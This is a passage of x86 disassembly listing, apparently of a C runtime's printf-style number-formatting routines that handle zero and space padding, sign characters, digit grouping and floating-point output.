  4066b0:	cmp    DWORD PTR [ebp-0x20],eax
  4066b3:	je     0x406950
  4066b9:	mov    edi,DWORD PTR [ebp-0x2c]
  4066bc:	test   edi,edi
  4066be:	jle    0x4068b4
  4066c4:	mov    edx,DWORD PTR [ebp-0x20]
  4066c7:	sub    edx,eax
  4066c9:	add    edx,edi
  4066cb:	test   edx,edx
  4066cd:	jle    0x4068b4
  4066d3:	add    edx,eax
  4066d5:	add    eax,0x1
  4066d8:	mov    BYTE PTR [eax-0x1],0x30
  4066dc:	cmp    eax,edx
  4066de:	jne    0x4066d5
  4066e0:	cmp    edx,DWORD PTR [ebp-0x20]
  4066e3:	jne    0x4066f2
  4066e5:	mov    edi,DWORD PTR [ebp-0x2c]
  4066e8:	test   edi,edi
  4066ea:	je     0x4066f2
  4066ec:	mov    BYTE PTR [edx],0x30
  4066ef:	add    edx,0x1
  4066f2:	mov    eax,edx
  4066f4:	sub    eax,DWORD PTR [ebp-0x20]
  4066f7:	cmp    eax,DWORD PTR [ebp-0x30]
  4066fa:	jge    0x4067b0
  406700:	mov    edi,DWORD PTR [ebp-0x30]
  406703:	sub    edi,eax
  406705:	mov    eax,DWORD PTR [ebp+0x8]
  406708:	test   edi,edi
  40670a:	mov    DWORD PTR [eax+0x8],edi
  40670d:	jle    0x4067bf
  406713:	cmp    DWORD PTR [ebp-0x28],0x6f
  406717:	mov    eax,DWORD PTR [ebp+0x8]
  40671a:	mov    eax,DWORD PTR [eax+0x4]
  40671d:	je     0x4068f4
  406723:	test   ah,0x8
  406726:	je     0x4067f0
  40672c:	sub    edi,0x2
  40672f:	test   edi,edi
  406731:	jle    0x40673e
  406733:	mov    ebx,DWORD PTR [ebp-0x2c]
  406736:	test   ebx,ebx
  406738:	js     0x406877
  40673e:	movzx  eax,BYTE PTR [ebp-0x28]
  406742:	test   edi,edi
  406744:	lea    ebx,[edx+0x2]
  406747:	mov    BYTE PTR [edx+0x1],0x30
  40674b:	mov    BYTE PTR [edx],al
  40674d:	jg     0x406806
  406753:	cmp    ebx,DWORD PTR [ebp-0x20]
  406756:	jbe    0x4067a4
  406758:	nop
  406759:	lea    esi,[esi+eiz*1+0x0]
  406760:	mov    DWORD PTR [ebp-0x1c],edi
  406763:	mov    esi,DWORD PTR [ebp-0x20]
  406766:	mov    edi,ebx
  406768:	mov    ebx,DWORD PTR [ebp+0x8]
  40676b:	nop
  40676c:	lea    esi,[esi+eiz*1+0x0]
  406770:	sub    edi,0x1
  406773:	movsx  eax,BYTE PTR [edi]
  406776:	mov    edx,ebx
  406778:	call   0x405f50
  40677d:	cmp    esi,edi
  40677f:	jb     0x406770
  406781:	mov    edi,DWORD PTR [ebp-0x1c]
  406784:	test   edi,edi
  406786:	lea    ebx,[edi-0x1]
  406789:	jle    0x4067a4
  40678b:	mov    esi,DWORD PTR [ebp+0x8]
  40678e:	xchg   ax,ax
  406790:	mov    edx,esi
  406792:	mov    eax,0x20
  406797:	sub    ebx,0x1
  40679a:	call   0x405f50
  40679f:	cmp    ebx,0xffffffff
  4067a2:	jne    0x406790
  4067a4:	lea    esp,[ebp-0xc]
  4067a7:	pop    ebx
  4067a8:	pop    esi
  4067a9:	pop    edi
  4067aa:	pop    ebp
  4067ab:	ret    
  4067ac:	lea    esi,[esi+eiz*1+0x0]
  4067b0:	mov    eax,DWORD PTR [ebp+0x8]
  4067b3:	mov    edi,0xffffffff
  4067b8:	mov    DWORD PTR [eax+0x8],0xffffffff
  4067bf:	cmp    DWORD PTR [ebp-0x28],0x6f
  4067c3:	je     0x406910
  4067c9:	mov    eax,DWORD PTR [ebp+0x8]
  4067cc:	mov    eax,DWORD PTR [eax+0x4]
  4067cf:	mov    DWORD PTR [ebp-0x1c],eax
  4067d2:	and    eax,0x800
  4067d7:	test   eax,eax
  4067d9:	mov    ebx,edx
  4067db:	je     0x406753
  4067e1:	jmp    0x40673e
  4067e6:	lea    esi,[esi+0x0]
  4067e9:	lea    edi,[edi+eiz*1+0x0]
  4067f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4067f3:	test   ecx,ecx
  4067f5:	js     0x406920
  4067fb:	test   ah,0x8
  4067fe:	mov    ebx,edx
  406800:	jne    0x40673e
  406806:	mov    eax,DWORD PTR [ebp+0x8]
  406809:	test   BYTE PTR [eax+0x5],0x4
  40680d:	jne    0x4068e0
  406813:	lea    esi,[edi-0x1]
  406816:	mov    edi,DWORD PTR [ebp+0x8]
  406819:	mov    DWORD PTR [ebp-0x1c],ebx
  40681c:	mov    ebx,esi
  40681e:	xchg   ax,ax
  406820:	mov    eax,0x20
  406825:	sub    ebx,0x1
  406828:	mov    edx,edi
  40682a:	call   0x405f50
  40682f:	lea    eax,[ebx+0x1]
  406832:	test   eax,eax
  406834:	jg     0x406820
  406836:	lea    edx,[esi-0x1]
  406839:	test   esi,esi
  40683b:	mov    eax,0x0
  406840:	mov    ebx,DWORD PTR [ebp-0x1c]
  406843:	cmovns eax,esi
  406846:	mov    edi,edx
  406848:	sub    edi,eax
  40684a:	cmp    DWORD PTR [ebp-0x20],ebx
  40684d:	jb     0x406760
  406853:	jmp    0x406784
  406858:	nop
  406859:	lea    esi,[esi+eiz*1+0x0]
  406860:	mov    eax,ecx
  406862:	mov    edx,0x55555556
  406867:	imul   edx
  406869:	mov    eax,ecx
  40686b:	sar    eax,0x1f
  40686e:	sub    edx,eax
  406870:	add    ecx,edx
  406872:	jmp    0x40662d
  406877:	mov    ecx,eax
  406879:	and    ecx,0x600
  40687f:	cmp    ecx,0x200
  406885:	jne    0x4067fb
  40688b:	lea    ebx,[edx+edi*1]
  40688e:	xchg   ax,ax
  406890:	add    edx,0x1
  406893:	mov    BYTE PTR [edx-0x1],0x30
  406897:	cmp    edx,ebx
  406899:	jne    0x406890
  40689b:	cmp    DWORD PTR [ebp-0x28],0x6f
  40689f:	je     0x406961
  4068a5:	and    eax,0x800
  4068aa:	mov    edi,0xffffffff
  4068af:	jmp    0x4067d7
  4068b4:	cmp    DWORD PTR [ebp-0x28],0x6f
  4068b8:	mov    edx,eax
  4068ba:	jne    0x4066e0
  4068c0:	mov    edi,DWORD PTR [ebp+0x8]
  4068c3:	test   BYTE PTR [edi+0x5],0x8
  4068c7:	je     0x4066e0
  4068cd:	add    edx,0x1
  4068d0:	mov    BYTE PTR [eax],0x30
  4068d3:	jmp    0x4066e0
  4068d8:	nop
  4068d9:	lea    esi,[esi+eiz*1+0x0]
  4068e0:	cmp    ebx,DWORD PTR [ebp-0x20]
  4068e3:	ja     0x406760
  4068e9:	lea    ebx,[edi-0x1]
  4068ec:	mov    esi,DWORD PTR [ebp+0x8]
  4068ef:	jmp    0x406790
  4068f4:	mov    esi,DWORD PTR [ebp-0x2c]
  4068f7:	test   esi,esi
  4068f9:	js     0x406920
  4068fb:	test   ah,0x4
  4068fe:	mov    ebx,edx
  406900:	jne    0x40684a
  406906:	lea    esi,[edi-0x1]
  406909:	mov    ebx,edx
  40690b:	jmp    0x406816
  406910:	cmp    DWORD PTR [ebp-0x20],edx
  406913:	mov    ebx,edx
  406915:	jb     0x406760
  40691b:	jmp    0x4067a4
  406920:	mov    ecx,eax
  406922:	and    ecx,0x600
  406928:	cmp    ecx,0x200
  40692e:	je     0x40688b
  406934:	cmp    DWORD PTR [ebp-0x28],0x6f
  406938:	jne    0x4067fb
  40693e:	test   ah,0x4
  406941:	mov    ebx,edx
  406943:	jne    0x40684a
  406949:	jmp    0x406906
  40694b:	nop
  40694c:	lea    esi,[esi+eiz*1+0x0]
  406950:	mov    edx,DWORD PTR [ebp-0x38]
  406953:	mov    edi,DWORD PTR [ebp+0x8]
  406956:	and    dh,0xf7
  406959:	mov    DWORD PTR [edi+0x4],edx
  40695c:	jmp    0x4066b9
  406961:	mov    edi,0xffffffff
  406966:	jmp    0x406753
  40696b:	nop
  40696c:	lea    esi,[esi+eiz*1+0x0]
  406970:	sub    esp,0x3c
  406973:	cmp    DWORD PTR [eax+0x10],0xfffffffd
  406977:	mov    edx,eax
  406979:	je     0x4069a0
  40697b:	movzx  ecx,WORD PTR [eax+0x14]
  40697f:	test   cx,cx
  406982:	jne    0x406992
  406984:	mov    eax,0x2e
  406989:	call   0x405f50
  40698e:	add    esp,0x3c
  406991:	ret    
  406992:	movzx  eax,cx
  406995:	call   0x405f50
  40699a:	add    esp,0x3c
  40699d:	ret    
  40699e:	xchg   ax,ax
  4069a0:	mov    DWORD PTR [esp+0x1c],eax
  4069a4:	mov    DWORD PTR [esp+0x2c],0x0
  4069ac:	call   0x40acf8
  4069b1:	lea    ecx,[esp+0x2c]
  4069b5:	mov    DWORD PTR [esp+0x8],0x10
  4069bd:	mov    DWORD PTR [esp+0xc],ecx
  4069c1:	mov    eax,DWORD PTR [eax]
  4069c3:	mov    DWORD PTR [esp+0x4],eax
  4069c7:	lea    eax,[esp+0x2a]
  4069cb:	mov    DWORD PTR [esp],eax
  4069ce:	call   0x40a850
  4069d3:	test   eax,eax
  4069d5:	mov    edx,DWORD PTR [esp+0x1c]
  4069d9:	jle    0x4069f0
  4069db:	movzx  ecx,WORD PTR [esp+0x2a]
  4069e0:	mov    WORD PTR [edx+0x14],cx
  4069e4:	mov    DWORD PTR [edx+0x10],eax
  4069e7:	jmp    0x40697f
  4069e9:	lea    esi,[esi+eiz*1+0x0]
  4069f0:	movzx  ecx,WORD PTR [edx+0x14]
  4069f4:	jmp    0x4069e4
  4069f6:	lea    esi,[esi+0x0]
  4069f9:	lea    edi,[edi+eiz*1+0x0]
  406a00:	push   ebp
  406a01:	push   edi
  406a02:	mov    ebp,eax
  406a04:	push   esi
  406a05:	push   ebx
  406a06:	mov    esi,ecx
  406a08:	mov    edi,edx
  406a0a:	sub    esp,0x1c
  406a0d:	test   esi,esi
  406a0f:	mov    ebx,DWORD PTR [esp+0x30]
  406a13:	mov    ecx,DWORD PTR [ebx+0x8]
  406a16:	jle    0x406be1
  406a1c:	cmp    esi,ecx
  406a1e:	jge    0x406b50
  406a24:	sub    ecx,esi
  406a26:	mov    DWORD PTR [ebx+0x8],ecx
  406a29:	test   ecx,ecx
  406a2b:	js     0x406b50
  406a31:	mov    eax,DWORD PTR [ebx+0xc]
  406a34:	cmp    eax,ecx
  406a36:	jge    0x406b50
  406a3c:	sub    ecx,eax
  406a3e:	test   ecx,ecx
  406a40:	mov    DWORD PTR [ebx+0x8],ecx
  406a43:	jle    0x406b5c
  406a49:	test   eax,eax
  406a4b:	jle    0x406c81
  406a51:	sub    ecx,0x1
  406a54:	test   esi,esi
  406a56:	mov    DWORD PTR [ebx+0x8],ecx
  406a59:	jle    0x406a65
  406a5b:	test   BYTE PTR [ebx+0x5],0x10
  406a5f:	jne    0x406b6e
  406a65:	test   ecx,ecx
  406a67:	jle    0x406aa9
  406a69:	test   ebp,ebp
  406a6b:	jne    0x406a7b
  406a6d:	mov    eax,DWORD PTR [ebx+0x4]
  406a70:	test   eax,0x1c0
  406a75:	je     0x406c60
  406a7b:	sub    ecx,0x1
  406a7e:	test   ecx,ecx
  406a80:	mov    DWORD PTR [ebx+0x8],ecx
  406a83:	jle    0x406aa9
  406a85:	test   DWORD PTR [ebx+0x4],0x600
  406a8c:	jne    0x406aa9
  406a8e:	jmp    0x406a9c
  406a90:	mov    edx,ebx
  406a92:	mov    eax,0x20
  406a97:	call   0x405f50
  406a9c:	mov    eax,DWORD PTR [ebx+0x8]
  406a9f:	lea    edx,[eax-0x1]
  406aa2:	test   eax,eax
  406aa4:	mov    DWORD PTR [ebx+0x8],edx
  406aa7:	jg     0x406a90
  406aa9:	test   ebp,ebp
  406aab:	jne    0x406bd0
  406ab1:	mov    eax,DWORD PTR [ebx+0x4]
  406ab4:	test   ah,0x1
  406ab7:	jne    0x406bf4
  406abd:	test   al,0x40
  406abf:	jne    0x406c70
  406ac5:	mov    edx,DWORD PTR [ebx+0x8]
  406ac8:	test   edx,edx
  406aca:	jle    0x406adf
  406acc:	mov    eax,DWORD PTR [ebx+0x4]
  406acf:	and    eax,0x600
  406ad4:	cmp    eax,0x200
  406ad9:	je     0x406c05
  406adf:	test   esi,esi
  406ae1:	jle    0x406c31
  406ae7:	lea    eax,[ebx+0x1c]
  406aea:	mov    ebp,0x55555556
  406aef:	mov    DWORD PTR [esp+0xc],eax
  406af3:	movzx  edx,BYTE PTR [edi]
  406af6:	mov    eax,0x30
  406afb:	test   dl,dl
  406afd:	je     0x406b05
  406aff:	add    edi,0x1
  406b02:	movsx  eax,dl
  406b05:	mov    edx,ebx
  406b07:	call   0x405f50
  406b0c:	sub    esi,0x1
  406b0f:	je     0x406d1f
  406b15:	test   BYTE PTR [ebx+0x5],0x10
  406b19:	je     0x406af3
  406b1b:	cmp    WORD PTR [ebx+0x1c],0x0
  406b20:	je     0x406af3
  406b22:	mov    eax,esi
  406b24:	imul   ebp
  406b26:	mov    eax,esi
  406b28:	sar    eax,0x1f
  406b2b:	sub    edx,eax
  406b2d:	lea    eax,[edx+edx*2]
  406b30:	cmp    esi,eax
  406b32:	jne    0x406af3
  406b34:	mov    eax,DWORD PTR [esp+0xc]
  406b38:	mov    ecx,ebx
  406b3a:	mov    edx,0x1
  406b3f:	call   0x405fb0
  406b44:	jmp    0x406af3
  406b46:	lea    esi,[esi+0x0]
  406b49:	lea    edi,[edi+eiz*1+0x0]
  406b50:	mov    DWORD PTR [ebx+0x8],0xffffffff
  406b57:	mov    ecx,0xffffffff
  406b5c:	test   esi,esi
  406b5e:	jle    0x406aa9
  406b64:	test   BYTE PTR [ebx+0x5],0x10
  406b68:	je     0x406aa9
  406b6e:	cmp    WORD PTR [ebx+0x1c],0x0
  406b73:	je     0x406a65
  406b79:	lea    eax,[esi+0x2]
  406b7c:	mov    edx,0x55555556
  406b81:	mov    DWORD PTR [esp+0xc],eax
  406b85:	imul   edx
  406b87:	mov    eax,DWORD PTR [esp+0xc]
  406b8b:	sar    eax,0x1f
  406b8e:	sub    edx,eax
  406b90:	cmp    edx,0x1
  406b93:	jle    0x406a65
  406b99:	test   ecx,ecx
  406b9b:	jle    0x406aa9
  406ba1:	mov    eax,ecx
  406ba3:	sub    eax,edx
  406ba5:	add    eax,0x1
  406ba8:	jmp    0x406bb8
  406baa:	lea    esi,[esi+0x0]
  406bb0:	test   ecx,ecx
  406bb2:	je     0x406d13
  406bb8:	sub    ecx,0x1
  406bbb:	cmp    ecx,eax
  406bbd:	jne    0x406bb0
  406bbf:	mov    DWORD PTR [ebx+0x8],ecx
  406bc2:	jmp    0x406a65
  406bc7:	mov    esi,esi
  406bc9:	lea    edi,[edi+eiz*1+0x0]
  406bd0:	mov    edx,ebx
  406bd2:	mov    eax,0x2d
  406bd7:	call   0x405f50
  406bdc:	jmp    0x406ac5
  406be1:	test   ecx,ecx
  406be3:	jle    0x406a29
  406be9:	sub    ecx,0x1
  406bec:	mov    DWORD PTR [ebx+0x8],ecx
  406bef:	jmp    0x406a31
  406bf4:	mov    edx,ebx
  406bf6:	mov    eax,0x2b
  406bfb:	call   0x405f50
  406c00:	jmp    0x406ac5
  406c05:	sub    edx,0x1
  406c08:	mov    DWORD PTR [ebx+0x8],edx
  406c0b:	nop
  406c0c:	lea    esi,[esi+eiz*1+0x0]
  406c10:	mov    edx,ebx
  406c12:	mov    eax,0x30
  406c17:	call   0x405f50
  406c1c:	mov    eax,DWORD PTR [ebx+0x8]
  406c1f:	lea    edx,[eax-0x1]
  406c22:	test   eax,eax
  406c24:	mov    DWORD PTR [ebx+0x8],edx
  406c27:	jg     0x406c10
  406c29:	test   esi,esi
  406c2b:	jg     0x406ae7
  406c31:	mov    eax,0x30
  406c36:	mov    edx,ebx
  406c38:	call   0x405f50
  406c3d:	mov    eax,DWORD PTR [ebx+0xc]
  406c40:	test   eax,eax
  406c42:	jg     0x406cb0
  406c44:	test   BYTE PTR [ebx+0x5],0x8
  406c48:	jne    0x406cb0
  406c4a:	test   esi,esi
  406c4c:	jne    0x406cf3
  406c52:	sub    eax,0x1
  406c55:	mov    DWORD PTR [ebx+0xc],eax
  406c58:	add    esp,0x1c
  406c5b:	pop    ebx
  406c5c:	pop    esi
  406c5d:	pop    edi
  406c5e:	pop    ebp
  406c5f:	ret    
  406c60:	test   ah,0x6
  406c63:	je     0x406a9c
  406c69:	jmp    0x406ab1
  406c6e:	xchg   ax,ax
  406c70:	mov    edx,ebx
  406c72:	mov    eax,0x20
  406c77:	call   0x405f50
  406c7c:	jmp    0x406ac5
  406c81:	mov    eax,DWORD PTR [ebx+0x4]
  406c84:	test   ah,0x8
  406c87:	jne    0x406a51
  406c8d:	test   esi,esi
  406c8f:	jle    0x406a69
  406c95:	test   ah,0x10
  406c98:	je     0x406a69
  406c9e:	cmp    WORD PTR [ebx+0x1c],0x0
  406ca3:	jne    0x406b79
  406ca9:	jmp    0x406a69
  406cae:	xchg   ax,ax
  406cb0:	mov    eax,ebx
  406cb2:	call   0x406970
  406cb7:	test   esi,esi
  406cb9:	je     0x406cd9
  406cbb:	jmp    0x406cf0
  406cbd:	lea    esi,[esi+0x0]
  406cc0:	movzx  edx,BYTE PTR [edi]
  406cc3:	mov    eax,0x30
  406cc8:	test   dl,dl
  406cca:	je     0x406cd2
  406ccc:	add    edi,0x1
  406ccf:	movsx  eax,dl
  406cd2:	mov    edx,ebx
  406cd4:	call   0x405f50
  406cd9:	mov    eax,DWORD PTR [ebx+0xc]
  406cdc:	lea    edx,[eax-0x1]
  406cdf:	test   eax,eax
  406ce1:	mov    DWORD PTR [ebx+0xc],edx
  406ce4:	jg     0x406cc0
  406ce6:	add    esp,0x1c
  406ce9:	pop    ebx
  406cea:	pop    esi
  406ceb:	pop    edi
  406cec:	pop    ebp
  406ced:	ret    
  406cee:	xchg   ax,ax
  406cf0:	mov    eax,DWORD PTR [ebx+0xc]
  406cf3:	add    eax,esi
  406cf5:	mov    DWORD PTR [ebx+0xc],eax
  406cf8:	nop
  406cf9:	lea    esi,[esi+eiz*1+0x0]
  406d00:	mov    edx,ebx
  406d02:	mov    eax,0x30
  406d07:	call   0x405f50
  406d0c:	add    esi,0x1
  406d0f:	jne    0x406d00
  406d11:	jmp    0x406cd9
  406d13:	mov    DWORD PTR [ebx+0x8],0x0
  406d1a:	jmp    0x406aa9
  406d1f:	mov    eax,DWORD PTR [ebx+0xc]
  406d22:	test   eax,eax
  406d24:	jle    0x406d30
  406d26:	mov    eax,ebx
  406d28:	call   0x406970
  406d2d:	jmp    0x406cd9
  406d2f:	nop
  406d30:	test   BYTE PTR [ebx+0x5],0x8
  406d34:	jne    0x406d26
  406d36:	jmp    0x406c52
  406d3b:	nop
  406d3c:	lea    esi,[esi+eiz*1+0x0]
  406d40:	push   ebp
  406d41:	push   edi
  406d42:	sub    ecx,0x1
  406d45:	push   esi
  406d46:	push   ebx
  406d47:	mov    ebx,0x66666667
  406d4c:	mov    ebp,edx
  406d4e:	mov    esi,0x1
  406d53:	sub    esp,0x2c
  406d56:	mov    DWORD PTR [esp+0x14],eax
  406d5a:	mov    eax,ecx
  406d5c:	mov    DWORD PTR [esp+0x18],ecx
  406d60:	sar    eax,0x1f
  406d63:	mov    edi,DWORD PTR [esp+0x40]
  406d67:	mov    DWORD PTR [esp+0x1c],eax
  406d6b:	mov    eax,ecx
  406d6d:	sar    ecx,0x1f
  406d70:	imul   ebx
  406d72:	mov    ebx,edx
  406d74:	sar    ebx,0x2
  406d77:	sub    ebx,ecx
  406d79:	je     0x406d93
  406d7b:	mov    ecx,0x66666667
  406d80:	mov    eax,ebx
  406d82:	sar    ebx,0x1f
  406d85:	add    esi,0x1
  406d88:	imul   ecx
  406d8a:	sar    edx,0x2
  406d8d:	sub    edx,ebx
  406d8f:	mov    ebx,edx
  406d91:	jne    0x406d80
  406d93:	mov    eax,DWORD PTR [edi+0x28]
  406d96:	cmp    esi,eax
  406d98:	cmovl  esi,eax
  406d9b:	mov    eax,DWORD PTR [edi+0x8]
  406d9e:	lea    edx,[esi+0x2]
  406da1:	cmp    eax,edx
  406da3:	jg     0x406e00
  406da5:	mov    DWORD PTR [edi+0x8],0xffffffff
  406dac:	mov    eax,DWORD PTR [esp+0x14]
  406db0:	mov    DWORD PTR [esp],edi
  406db3:	mov    ecx,0x1
  406db8:	mov    edx,ebp
  406dba:	add    esi,0x1
  406dbd:	call   0x406a00
  406dc2:	mov    eax,DWORD PTR [edi+0x28]
  406dc5:	mov    DWORD PTR [edi+0xc],eax
  406dc8:	mov    eax,DWORD PTR [edi+0x4]
  406dcb:	mov    edx,eax
  406dcd:	and    eax,0x20
  406dd0:	or     edx,0x1c0
  406dd6:	or     eax,0x45
  406dd9:	mov    DWORD PTR [edi+0x4],edx
  406ddc:	mov    edx,edi
  406dde:	call   0x405f50
  406de3:	add    DWORD PTR [edi+0x8],esi
  406de6:	mov    eax,DWORD PTR [esp+0x18]
  406dea:	mov    ecx,edi
  406dec:	mov    edx,DWORD PTR [esp+0x1c]
  406df0:	call   0x4062c0
  406df5:	add    esp,0x2c
  406df8:	pop    ebx
  406df9:	pop    esi
  406dfa:	pop    edi
  406dfb:	pop    ebp
  406dfc:	ret    
  406dfd:	lea    esi,[esi+0x0]
  406e00:	sub    eax,edx
  406e02:	mov    DWORD PTR [edi+0x8],eax
  406e05:	jmp    0x406dac
  406e07:	mov    esi,esi
  406e09:	lea    edi,[edi+eiz*1+0x0]
  406e10:	push   esi
  406e11:	push   ebx
  406e12:	mov    ebx,eax
  406e14:	sub    esp,0x44
  406e17:	mov    edx,DWORD PTR [eax+0xc]
  406e1a:	test   edx,edx
  406e1c:	js     0x406e90
  406e1e:	add    edx,0x1
  406e21:	fld    TBYTE PTR [esp+0x50]
  406e25:	lea    eax,[esp+0x28]
  406e29:	mov    DWORD PTR [esp+0x10],edx
  406e2d:	mov    DWORD PTR [esp+0x18],eax
  406e31:	lea    eax,[esp+0x2c]
  406e35:	mov    DWORD PTR [esp+0x14],eax
  406e39:	fstp   TBYTE PTR [esp+0x30]
  406e3d:	mov    eax,DWORD PTR [esp+0x30]
  406e41:	mov    DWORD PTR [esp],eax
  406e44:	mov    eax,DWORD PTR [esp+0x34]
  406e48:	mov    DWORD PTR [esp+0x4],eax
  406e4c:	mov    eax,DWORD PTR [esp+0x38]
  406e50:	mov    DWORD PTR [esp+0x8],eax
  406e54:	mov    eax,DWORD PTR [esp+0x3c]
  406e58:	mov    DWORD PTR [esp+0xc],eax
  406e5c:	mov    eax,0x2
  406e61:	call   0x405e50
  406e66:	mov    ecx,DWORD PTR [esp+0x2c]
  406e6a:	mov    esi,eax
  406e6c:	cmp    ecx,0xffff8000
  406e72:	je     0x406ea0
  406e74:	mov    edx,eax
  406e76:	mov    eax,DWORD PTR [esp+0x28]
  406e7a:	mov    DWORD PTR [esp],ebx
  406e7d:	call   0x406d40
  406e82:	mov    DWORD PTR [esp],esi
  406e85:	call   0x408240
  406e8a:	add    esp,0x44
  406e8d:	pop    ebx
  406e8e:	pop    esi
  406e8f:	ret    
  406e90:	mov    DWORD PTR [eax+0xc],0x6
  406e97:	mov    edx,0x7
  406e9c:	jmp    0x406e21
  406e9e:	xchg   ax,ax
  406ea0:	mov    edx,eax
  406ea2:	mov    eax,DWORD PTR [esp+0x28]
  406ea6:	mov    ecx,ebx
  406ea8:	call   0x406220
  406ead:	mov    DWORD PTR [esp],esi
  406eb0:	call   0x408240
  406eb5:	add    esp,0x44
  406eb8:	pop    ebx
  406eb9:	pop    esi
  406eba:	ret    
  406ebb:	nop
  406ebc:	lea    esi,[esi+eiz*1+0x0]
  406ec0:	push   edi
  406ec1:	push   esi
  406ec2:	push   ebx
  406ec3:	mov    ebx,eax
  406ec5:	sub    esp,0x40
  406ec8:	mov    eax,DWORD PTR [eax+0xc]
  406ecb:	test   eax,eax
  406ecd:	js     0x406f70
  406ed3:	fld    TBYTE PTR [esp+0x50]
  406ed7:	mov    DWORD PTR [esp+0x10],eax
  406edb:	lea    edx,[esp+0x28]
  406edf:	mov    DWORD PTR [esp+0x18],edx
  406ee3:	lea    edx,[esp+0x2c]
  406ee7:	mov    DWORD PTR [esp+0x14],edx
  406eeb:	fstp   TBYTE PTR [esp+0x30]
  406eef:	mov    eax,DWORD PTR [esp+0x30]
  406ef3:	mov    DWORD PTR [esp],eax
  406ef6:	mov    eax,DWORD PTR [esp+0x34]
  406efa:	mov    DWORD PTR [esp+0x4],eax
  406efe:	mov    eax,DWORD PTR [esp+0x38]
  406f02:	mov    DWORD PTR [esp+0x8],eax
  406f06:	mov    eax,DWORD PTR [esp+0x3c]
  406f0a:	mov    DWORD PTR [esp+0xc],eax
  406f0e:	mov    eax,0x3
  406f13:	call   0x405e50
  406f18:	mov    ecx,DWORD PTR [esp+0x2c]
  406f1c:	mov    edi,eax
  406f1e:	cmp    ecx,0xffff8000
  406f24:	je     0x406f81
  406f26:	mov    edx,eax
  406f28:	mov    eax,DWORD PTR [esp+0x28]
  406f2c:	mov    DWORD PTR [esp],ebx
  406f2f:	call   0x406a00
  406f34:	mov    eax,DWORD PTR [ebx+0x8]
  406f37:	lea    edx,[eax-0x1]
  406f3a:	test   eax,eax
  406f3c:	mov    DWORD PTR [ebx+0x8],edx
  406f3f:	jle    0x406f5a
  406f41:	mov    edx,ebx
  406f43:	mov    eax,0x20
  406f48:	call   0x405f50
  406f4d:	mov    ecx,DWORD PTR [ebx+0x8]
  406f50:	lea    esi,[ecx-0x1]
  406f53:	test   ecx,ecx
  406f55:	mov    DWORD PTR [ebx+0x8],esi
  406f58:	jg     0x406f41
  406f5a:	mov    DWORD PTR [esp],edi
  406f5d:	call   0x408240
  406f62:	add    esp,0x40
  406f65:	pop    ebx
  406f66:	pop    esi
  406f67:	pop    edi
  406f68:	ret    
  406f69:	lea    esi,[esi+eiz*1+0x0]
  406f70:	mov    DWORD PTR [ebx+0xc],0x6
  406f77:	mov    eax,0x6
  406f7c:	jmp    0x406ed3
  406f81:	mov    edx,eax
  406f83:	mov    eax,DWORD PTR [esp+0x28]
  406f87:	mov    ecx,ebx
  406f89:	call   0x406220
  406f8e:	mov    DWORD PTR [esp],edi
  406f91:	call   0x408240
  406f96:	add    esp,0x40
  406f99:	pop    ebx
  406f9a:	pop    esi
  406f9b:	pop    edi
  406f9c:	ret    
  406f9d:	lea    esi,[esi+0x0]
  406fa0:	push   edi
  406fa1:	push   esi
  406fa2:	push   ebx
  406fa3:	mov    ebx,eax
  406fa5:	sub    esp,0x40
  406fa8:	mov    eax,DWORD PTR [eax+0xc]
  406fab:	test   eax,eax
  406fad:	js     0x4070e0
  406fb3:	je     0x4070c3
  406fb9:	fld    TBYTE PTR [esp+0x50]
  406fbd:	mov    DWORD PTR [esp+0x10],eax
  406fc1:	lea    edx,[esp+0x28]
  406fc5:	mov    DWORD PTR [esp+0x18],edx
  406fc9:	lea    edx,[esp+0x2c]
  406fcd:	mov    DWORD PTR [esp+0x14],edx
  406fd1:	fstp   TBYTE PTR [esp+0x30]
  406fd5:	mov    eax,DWORD PTR [esp+0x30]
  406fd9:	mov    DWORD PTR [esp],eax
  406fdc:	mov    eax,DWORD PTR [esp+0x34]
  406fe0:	mov    DWORD PTR [esp+0x4],eax
  406fe4:	mov    eax,DWORD PTR [esp+0x38]
  406fe8:	mov    DWORD PTR [esp+0x8],eax
  406fec:	mov    eax,DWORD PTR [esp+0x3c]
  406ff0:	mov    DWORD PTR [esp+0xc],eax
  406ff4:	mov    eax,0x2
  406ff9:	call   0x405e50
  406ffe:	mov    esi,DWORD PTR [esp+0x2c]
  407002:	mov    edi,eax
  407004:	cmp    esi,0xffff8000
  40700a:	je     0x407100
  407010:	cmp    esi,0xfffffffd
  407013:	jl     0x407090
  407015:	mov    eax,DWORD PTR [ebx+0xc]
  407018:	cmp    esi,eax
  40701a:	jg     0x407090
  40701c:	test   BYTE PTR [ebx+0x5],0x8
  407020:	jne    0x4070f1
  407026:	mov    DWORD PTR [esp],edi
  407029:	call   0x40acd0
  40702e:	sub    eax,esi
  407030:	test   eax,eax
  407032:	mov    DWORD PTR [ebx+0xc],eax
  407035:	js     0x407110
  40703b:	mov    eax,DWORD PTR [esp+0x28]
  40703f:	mov    edx,edi
  407041:	mov    DWORD PTR [esp],ebx
  407044:	mov    ecx,esi
  407046:	call   0x406a00
  40704b:	mov    eax,DWORD PTR [ebx+0x8]
  40704e:	lea    edx,[eax-0x1]
  407051:	test   eax,eax
  407053:	mov    DWORD PTR [ebx+0x8],edx
  407056:	jle    0x4070b4
  407058:	nop
  407059:	lea    esi,[esi+eiz*1+0x0]
  407060:	mov    edx,ebx
  407062:	mov    eax,0x20
  407067:	call   0x405f50
  40706c:	mov    ecx,DWORD PTR [ebx+0x8]
  40706f:	lea    esi,[ecx-0x1]
  407072:	test   ecx,ecx
  407074:	mov    DWORD PTR [ebx+0x8],esi
  407077:	jg     0x407060
  407079:	mov    DWORD PTR [esp],edi
  40707c:	call   0x408240
  407081:	add    esp,0x40
  407084:	pop    ebx
  407085:	pop    esi
  407086:	pop    edi
  407087:	ret    
  407088:	nop
  407089:	lea    esi,[esi+eiz*1+0x0]
  407090:	test   BYTE PTR [ebx+0x5],0x8
  407094:	jne    0x4070d4
  407096:	mov    DWORD PTR [esp],edi
  407099:	call   0x40acd0
  40709e:	sub    eax,0x1
  4070a1:	mov    DWORD PTR [ebx+0xc],eax
  4070a4:	mov    eax,DWORD PTR [esp+0x28]
  4070a8:	mov    DWORD PTR [esp],ebx
  4070ab:	mov    ecx,esi
  4070ad:	mov    edx,edi
  4070af:	call   0x406d40
  4070b4:	mov    DWORD PTR [esp],edi
  4070b7:	call   0x408240
  4070bc:	add    esp,0x40
  4070bf:	pop    ebx
  4070c0:	pop    esi
  4070c1:	pop    edi
  4070c2:	ret    
  4070c3:	mov    DWORD PTR [ebx+0xc],0x1
